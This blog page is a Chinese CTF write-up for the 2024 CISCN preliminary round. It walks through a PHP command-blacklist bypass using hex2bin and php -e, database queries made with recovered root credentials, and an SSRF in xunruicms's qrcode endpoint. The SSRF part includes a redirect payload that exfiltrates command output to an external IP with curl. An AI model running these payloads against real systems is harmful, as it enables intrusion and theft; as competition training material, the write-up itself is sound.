<!doctype html>
<html lang="zh"><head>
<title>2024ciscn初赛WP - Hello!</title>
<meta charset="UTF-8">
<meta name="keywords" content="">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">

<link rel="shortcut icon" href="/images/2.ico" type="image/x-icon" />
<meta name="description" content="解题过程WebSimple_php进去就给了源码 1234567891011121314&lt;?phpini_set(&#x27;open_basedir&#x27;, &#x27;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#x27;);error_reporting(0);if(isset($_POST[&#x27;cmd&#x27;]))&#123;    $cmd &#x3D; escapeshellcmd($">
<meta property="og:type" content="article">
<meta property="og:title" content="2024ciscn初赛WP">
<meta property="og:url" content="https://m1racle-7.github.io/2024/05/21/2024ciscn%E5%88%9D%E8%B5%9BWP/index.html">
<meta property="og:site_name" content="Hello!">
<meta property="og:description" content="解题过程WebSimple_php进去就给了源码 1234567891011121314&lt;?phpini_set(&#x27;open_basedir&#x27;, &#x27;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#x27;);error_reporting(0);if(isset($_POST[&#x27;cmd&#x27;]))&#123;    $cmd &#x3D; escapeshellcmd($">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/tuchuang/master/tuchuang/1716110470999-927dd8da-6131-4a24-b9a6-2438a63395b2-17283880828337.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/tuchuang/master/tuchuang/1716110627351-61becbb0-924a-4471-b0b3-b909c957ff3c-17283880828339.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/tuchuang/master/tuchuang/1716111041058-d57ae86e-a5d5-4a09-a205-200d592f3009-172838808283311.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/tuchuang/master/tuchuang/1716111858477-ac8dac91-93ba-4d5a-bbd4-f35ed7da19e1-172838808283313.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/tuchuang/master/tuchuang/1716111911072-b9ba7f61-80ac-4fe6-9848-d32121d077b5-172838808283315.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/tuchuang/master/tuchuang/1716112169684-76c4be65-7714-416b-9667-ffa3811c664a-172838808283317.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716107893058-795ca8a5-f85d-40fd-a14d-3fae6c5c99ec-172838808283319.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109080295-9348f954-4226-4532-8bef-281a8edee8fb-172838808283321.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716107953988-e87a1ea0-4bf5-42a3-8997-6b494324b226-172838808283323.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108012698-56f89173-a66a-43ab-b77f-bbdca6242c03-172838808283325.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108822678-6d56f64d-0f78-471f-b4c3-3d163f5fcd9e-172838808283327.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108839871-a8ebd7c7-26d4-4a82-a738-feba086d9ab3-172838808283329.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108858287-5cf9345a-2701-4b6e-82d2-e7e2d7c5c37a-172838808283331.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109042231-00454086-fd1f-41ac-8f9c-2db3a0d06699-172838808283333.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109087152-ac6c9339-7e76-41c6-9e3b-5b023ce5b76c-172838808283335.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716110746420-df146dee-4c83-4ab1-ae06-d347920ff362-172838808283337.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716111609926-03e0e9df-e80d-4a19-83a3-ba4e51bad7bc-172838808283439.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716111652950-c343011b-6f6e-46e3-adbf-80080f1e5e4e-172838808283441.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716106492580-26b1e005-7512-42d9-a272-151cd3f43b17-172838808283443.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716107572564-18f01d74-a502-40d8-af18-9f2c23c4d3a4-172838808283445.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716107764486-62638e04-f9c4-4218-9de0-f56184826389-172838808283447.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716107925246-fe0a3e99-3fbd-4c65-9069-b3e0db9b6c6d-172838808283449.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108031213-a6565110-6e74-4b6b-870b-4b311fdba2f9-172838808283451.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108094760-e1590f14-1867-4228-8b08-26a43e592d5e-172838808283453.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108192751-d5e40af9-9475-41b2-9ddc-31427c36089b-172838808283455.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108300557-25e6cd01-2729-47c5-9490-c04ef5a82deb-172838808283457.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108384838-aa51d603-310f-4674-8b7f-5c29dec629ac-172838808283459.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108414303-ed12dfe7-8dfb-43f3-a604-53a7faa1c689-172838808283461.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108449233-8834d997-0c5b-4849-a675-1bb86e310e60-172838808283463.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108629143-0d7aab51-366f-40f3-9ac2-efc31576b3bc-172838808283465.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108642560-2fe27b40-d301-4b10-ac41-6d019d8c9fc8-172838808283467.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108872948-8899a2b1-85d3-44ae-b15a-f932c3e3b90f-172838808283469.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109032598-2b029db2-3a2b-4d7b-9616-1b58cd646e07-172838808283471.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108989806-a7901a7e-b2f9-4b98-8e07-1f3dc64b0933-172838808283473.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716106998432-8d9281e6-78d5-4767-9d57-2748fde14a80-172838808283475.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716106978866-2cbc8c98-b5a2-407f-8d7e-e5dc912f3eb9-172838808283477.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109359865-6a66e95f-4841-419d-834f-82d27db8a1b6-172838808283479.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109410500-69b85e2a-6fb6-4bbd-8f99-57042d6cb5bb-172838808283481.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109807249-dfa68f6f-b9b1-428a-987a-d0dcfc97440b-172838808283483.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716110896418-ec5dd2d6-4731-47e9-ac78-acb22a0b554c-172838808283485.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716111008510-fded6daa-2ee9-45c9-987c-09eaecab185c-172838808283487.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716107133474-6dd6bd70-f747-4e79-82d0-bd71353915ef-172838808283489.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109884779-17e06c83-6fc5-4814-bd3c-48dc2b4e2d3b-172838808283491.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109932327-1f17bb8d-f10b-4e67-b587-873ccedb086b-172838808283493.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716110117071-af6369b0-a2ff-4e9b-a55e-3bb343104144-172838808283495.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716110388906-19b8d9e8-944d-4754-abc1-bb32539cf928-172838808283497.png">
<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108171134-d0c78cae-29d9-40d8-98cb-2cc66768bf09-172838808283499.png">
<meta property="article:published_time" content="2024-05-20T16:00:00.000Z">
<meta property="article:modified_time" content="2024-10-08T12:02:32.434Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/M1racle-7/tuchuang/master/tuchuang/1716110470999-927dd8da-6131-4a24-b9a6-2438a63395b2-17283880828337.png">

<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">


<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1729473846056">

<link rel="stylesheet" href="/css/style.css?v=1729473846056">




    
        <link rel="stylesheet" href="/custom.css?v=1729473846056">
    



<script src="/lib/mdui_043tiny/mdui.js" async></script>
<script src="/lib/fancybox/fancybox.umd.js" async></script>
<script src="/lib/lax.min.js" async></script>


<script async src="/js/app.js?v=1729473846056"></script>

 

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag("js", new Date());

  gtag("config", "G-4D4ZJ9G024");
</script>


<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
<meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(/images/b.png)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="John Doe"><img src="/images/a.jpg" alt="John Doe"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="John Doe">
            <img src="/images/a.jpg" alt="John Doe" alt="John Doe">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>5</div>
        <div><span>标签</span>3</div>
        <div><span>分类</span>3</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
            <div class="mdui-list-item-content">
                文章归档
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="友链">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                友链
            </div>
        </a>
        
    </div>
    
    
        
        <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
        
            <form id="search_form">
                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="搜索" style="
                    font-size: 15px !important;
                    height: 56px !important;
                    background-image: none;
                "></label>
            </form>
         
    </div>
</div>


	<script async src="/js/search.js?v=1729473846057"></script>



    
        
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章分类</h3>
    <div class="nexmoe-widget">

      <ul class="category-list">

        


        

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/CTF/">CTF</a>
          <span class="category-list-count">2</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/PHP/">PHP</a>
          <span class="category-list-count">2</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/linux/">linux</a>
          <span class="category-list-count">1</span>
        </li>

        
      </ul>

    </div>
  </div>


    
        
        
  <div class="nexmoe-widget-wrap">
    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/PHP/" style="font-size: 20px;">PHP</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a>
    </div>
    
      <script>
        var maxTagcloud = parseInt(17);
        var tags_length = parseInt(3);
        var tags_arr = [];
        for(var i = 0; i < tags_length; i++){
          tags_arr.push(i);
        }
        tags_arr.sort(function (l, r) {
          return Math.random() > 0.5 ? -1 : 1;
        });
        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
        }
      </script>
    
  </div>

    
        
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章归档</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">5</span></li></ul>
    </div>
  </div>



    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">最新文章</h3>
    <div class="nexmoe-widget">
      <ul>
        
          <li>
            <a href="/2024/10/21/2024%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81WP/">2024强网拟态WP-- by MYGO!!!</a>
          </li>
        
          <li>
            <a href="/2024/10/09/%E6%97%A0curl%E3%80%81wget%E8%AE%BF%E9%97%AE%E4%B8%8B%E8%BD%BD%E4%BA%92%E8%81%94%E7%BD%91%E8%B5%84%E6%BA%90/">无curl、wget下的环境来访问下载工具</a>
          </li>
        
          <li>
            <a href="/2024/10/07/PHP%20Filter%E9%93%BE%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8Eoracle%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%94%BB%E5%87%BB/">PHP Filter链——基于oracle的文件读取攻击</a>
          </li>
        
          <li>
            <a href="/2024/09/27/%E6%94%BB%E5%87%BBPHP-FPM/">攻击PHP-FPM</a>
          </li>
        
          <li>
            <a href="/2024/05/21/2024ciscn%E5%88%9D%E8%B5%9BWP/">2024ciscn初赛WP</a>
          </li>
        
      </ul>
    </div>
  </div>

    
   
    <div class="nexmoe-copyright">
        &copy; 2024 John Doe
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        
    </div>
</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
  <article>
    
        <div class="nexmoe-post-cover absolute" style="padding-top: 40%;"> 
            <img src="https://www.loliapi.com/bg/" alt="2024ciscn初赛WP" loading="lazy">
            <h1>2024ciscn初赛WP</h1>
        </div>
    
    
    <div class="nexmoe-post-meta">
    <div class="nexmoe-rainbow">
        <a class="nexmoefont icon-calendar-fill">2024年05月21日</a>
        
            <a class="nexmoefont icon-appstore-fill -link" href="/categories/CTF/">CTF</a>
        
        
    </div>
    
    
    
    
    
</div>

    <h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h4><p>进去就给了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一看这逆天正则,几乎把所有的命令都禁了,真nb啊,不过看了半天发现他的php的命令没过,并且-也没被过滤,所以就有可乘之机辣!!!</p>
<p>可以利用php -e命令来执行php代码</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/tuchuang/master/tuchuang/1716110470999-927dd8da-6131-4a24-b9a6-2438a63395b2-17283880828337.png" alt="img" data-caption="img" loading="lazy"></p>
<p>不过这个逆天正则把’和”都过滤了,以及一堆特殊符号</p>
<p>真别说,搜搜咋执行的时候找到了第12届国赛的题,有了思路</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/tuchuang/master/tuchuang/1716110627351-61becbb0-924a-4471-b0b3-b909c957ff3c-17283880828339.png" alt="img" data-caption="img" loading="lazy"></p>
<p>真帅吧,这操作,字符串转16进制的话会有字母,也就是这是一个字符串,需要单双引号,但是被禁用了,不过可以把他转成36进制,这样就不含字母了,这思路真nb</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="title function_">base_convert</span><span class="params">(<span class="string">&#x27;ls&#x27;</span>, <span class="number">36</span>, <span class="number">10</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>可以用这个函数来转换字符串,</p>
<p>base_convert(1751504350,10,36)(base_convert(17523,10,36));这样的话就构造成了system(dir)</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/tuchuang/master/tuchuang/1716111041058-d57ae86e-a5d5-4a09-a205-200d592f3009-172838808283311.png" alt="img" data-caption="img" loading="lazy"></p>
<p>可以发现报错的最前面有个index.php,说明执行成功,完美~</p>
<p>不过base_convert这个函数有个缺陷只能构造出0-9,a-z,其他整不出来,有些可惜,不过思路打开了</p>
<p>其实如果想继续用这个构造的话可以搭配其他进制转换函数,不过构造会有点恶心.所以搜搜其他解法,</p>
<p>发现php有个特性,想要不带单双引号的整字符串的话,可以在它的前面加上下划线,这样就会被识别成字符串,所以就可以利用另一个进制转换函数hex2bin来构造执行命令了</p>
<p>直接利用php的bin2hex来字符串转成16进制即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;system(&#x27;cat /etc/passwd&#x27;);&quot;</span>));</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/tuchuang/master/tuchuang/1716111858477-ac8dac91-93ba-4d5a-bbd4-f35ed7da19e1-172838808283313.png" alt="img" data-caption="img" loading="lazy"></p>
<p>看根目录没flag,猜测可能在数据库里</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/tuchuang/master/tuchuang/1716111911072-b9ba7f61-80ac-4fe6-9848-d32121d077b5-172838808283315.png" alt="img" data-caption="img" loading="lazy"></p>
<p>&#x2F;etc&#x2F;passwd里面有mysql数据库,爆出root&#x2F;root用户名密码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;echo `mysql -u root -p&#x27;root&#x27; -e &#x27;show databases&#x27;`&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;show tables;&#x27;`&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;select* from F1ag_Se3Re7&#x27;`&quot;</span>));</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/tuchuang/master/tuchuang/1716112169684-76c4be65-7714-416b-9667-ffa3811c664a-172838808283317.png" alt="img" data-caption="img" loading="lazy"></p>
<h4 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h4><p>看题目描述是昨天的easycms升级版，但最后好像也没升级啥。日，昨天找到了ssrf点，但没打通，可惜了</p>
<p>首先他是一个xunrui的cms，github上有他源码<a target="_blank" rel="noopener" href="https://github.com/dayrui/xunruicms?tab=readme-ov-file">https://github.com/dayrui/xunruicms?tab=readme-ov-file</a></p>
<p>然后在第一天的cms里给了flag.php的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于这个REMOTE_ADDR伪造不了,只能通过ssrf来打,之前vecctf有个类似的题,所以搜搜xunruicms的漏洞,看看有没有关于ssrf的.</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716107893058-795ca8a5-f85d-40fd-a14d-3fae6c5c99ec-172838808283319.png" alt="img" data-caption="img" loading="lazy"></p>
<p>还可以发现有个贵州cms和他洞差不多</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716109080295-9348f954-4226-4532-8bef-281a8edee8fb-172838808283321.png" alt="img" data-caption="img" loading="lazy"></p>
<p>可以看到他有个qrcode的ssrf,不过这个cnvd不公开,得自己审下源码</p>
<p>所以需要咱们down下来自己分析</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716107953988-e87a1ea0-4bf5-42a3-8997-6b494324b226-172838808283323.png" alt="img" data-caption="img" loading="lazy"></p>
<p>,直接先搜搜qrcode,在这几个文件里来回审审</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108012698-56f89173-a66a-43ab-b77f-bbdca6242c03-172838808283325.png" alt="img" data-caption="img" loading="lazy"></p>
<p>可以看到,在Helper这个文件里面存在着这个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=<span class="string">&#x27;.urlencode($thumb).&#x27;</span>&amp;text=<span class="string">&#x27;.urlencode($text).&#x27;</span>&amp;size=<span class="string">&#x27;.$size.&#x27;</span>&amp;level=<span class="string">&#x27;.$level;</span></span><br></pre></td></tr></table></figure>

<p>看他上面注释也能知道这是个二维码调用的函数,然后再看他参数,基本都能被咱们控制,而且这个thumb参数是可以输入url远程调用二维码的,因此就给了咱们机会.可以实现SSRF!!!!</p>
<p>这样思路就清晰了,直接在自己vps上整个恶意文件,伪装成二维码,然后重定向到flag.php,再用cmd来执行命令,完美~~~~</p>
<p>构造恶意文件:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define width 1000</span></span><br><span class="line"><span class="comment">#define height 1000</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:http://127.0.0.1/flag.php?cmd=curl http://59.110.28.63:6666/?id=`/readflag`&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用header来重定向到flag.php,接着通过curl来外带命令执行结果,再开个python http服务来接收即可.</p>
<p><a target="_blank" rel="noopener" href="http://eci-2ze4u7rbddg2d2cl58s7.cloudeci1.ichunqiu.com/index.php?s=api&c=api&m=qrcode&thumb=http://59.110.28.63/1.php&text=1&size=10&level=10">http://eci-2ze4u7rbddg2d2cl58s7.cloudeci1.ichunqiu.com/index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=http://59.110.28.63/1.php&amp;text=1&amp;size=10&amp;level=10</a></p>
<p>日,之前一直读的&#x2F;flag,没有tmd</p>
<p>之后再好好看根目录才发现有个readflag,眼瞎了</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108822678-6d56f64d-0f78-471f-b4c3-3d163f5fcd9e-172838808283327.png" alt="img" data-caption="img" loading="lazy"></p>
<p>flag{5fb5c22e-5667-47c3-9959-0fc6e43f483e}</p>
<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="大学生安全测试能力调研问卷"><a href="#大学生安全测试能力调研问卷" class="headerlink" title="大学生安全测试能力调研问卷"></a>大学生安全测试能力调研问卷</h4><p>填就完事了</p>
<h4 id="火锅链观光打卡"><a href="#火锅链观光打卡" class="headerlink" title="火锅链观光打卡"></a>火锅链观光打卡</h4><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108839871-a8ebd7c7-26d4-4a82-a738-feba086d9ab3-172838808283329.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/1716108858287-5cf9345a-2701-4b6e-82d2-e7e2d7c5c37a-172838808283331.png" alt="img" data-caption="img" loading="lazy"></p>
<p>安装MetaMask，然后连接钱包，然后答题</p>
